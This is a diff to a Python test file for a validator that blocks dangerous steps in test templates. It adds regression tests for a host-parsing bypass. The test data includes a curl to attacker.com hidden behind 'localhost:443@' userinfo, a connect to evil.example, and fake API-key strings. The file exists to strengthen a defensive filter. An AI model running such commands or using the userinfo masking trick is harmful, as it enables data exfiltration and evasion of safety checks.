@@ -70,12 +70,44 @@ def test_clean_template_is_allowed() -> None:
         ("steps", ["connect to evil.example directly, no scheme needed"]),
         ("steps", ["the leaked value was sk-proj-" + "A" * 40]),
         ("steps", ["the leaked value was AIza" + "B" * 35]),
+        # Codex#4 (round 15, 2026-09-14), reproduced exactly as reported:
+        # the old `.split(":")[0]` truncation treated USERINFO (the part
+        # before "@" in "user:pass@host") as the destination host, so a
+        # URL with an attacker host hidden behind innocuous-looking
+        # userinfo passed unrecognized.
+        ("steps", ["curl https://localhost:443@attacker.com/x"]),
+        # Codex#4 (round 15, 2026-09-14): a bare (schemeless) IPv6 literal
+        # matched neither the old URI-authority nor bare-hostname
+        # alternative (colon-separated hex groups, not dot-separated
+        # labels).
+        ("steps", ["connect to 2606:4700:4700::1111 directly"]),
     ],
 )
 def test_dangerous_content_is_blocked(field: str, value: list[str]) -> None:
     decision = validate_safe_test(_base(**{field: value}))
     assert decision.outcome is PolicyOutcome.POLICY_BLOCKED
     assert decision.reasons
+
+
+def test_userinfo_does_not_mask_the_real_host_in_a_url() -> None:
+    """Regression for Codex#4 (round 15, 2026-09-14), reproduced exactly
+    as reported: `https://localhost:443@attacker.com/x` used to be
+    truncated at the first ":" to just "localhost" (a _SAFE_HOST), so the
+    real destination - attacker.com, after the "@" - was never inspected
+    at all. The blocked reason must name the ACTUAL host, not the
+    userinfo standing in front of it."""
+    decision = validate_safe_test(
+        _base(steps=["curl https://localhost:443@attacker.com/x"])
+    )
+    assert decision.outcome is PolicyOutcome.POLICY_BLOCKED
+    assert any("attacker.com" in reason for reason in decision.reasons)
+
+
+def test_bare_ipv6_loopback_is_allowed_like_127_0_0_1() -> None:
+    """Mirror case for the round-15 IPv6 fix: ::1 (the IPv6 loopback,
+    exactly as trusted as 127.0.0.1) must not be flagged."""
+    decision = validate_safe_test(_base(steps=["connect to ::1 for the sandboxed check"]))
+    assert decision.outcome is PolicyOutcome.ALLOWED
 
 
 @pytest.mark.parametrize(
